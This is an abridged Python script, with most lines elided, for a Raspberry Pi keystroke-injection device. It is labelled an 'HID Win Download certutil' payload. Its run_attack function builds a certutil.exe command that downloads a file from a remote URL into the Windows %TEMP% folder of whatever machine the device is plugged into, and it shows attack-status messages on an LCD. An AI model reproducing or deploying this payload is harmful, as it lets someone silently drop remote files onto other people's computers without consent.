...
def draw_ui(screen_state="main"):
    ...
    d.text((5, 5), "Win Download certutil", font=FONT_TITLE, fill="#00FF00")
    ...
    if screen_state == "main":
        ...
        d.text((5, 50), "Injecting certutil...", font=FONT_TITLE, fill="yellow")
...
def run_attack():
    ...
    cmd = f"certutil.exe -urlcache -split -f {FILE_URL} %TEMP%\\{OUTPUT_FILENAME}"
...
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Win Download certutil.", file=sys.stderr)
        sys.exit(1)
    ...
    try:
        ...
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Win Download certutil payload finished.")
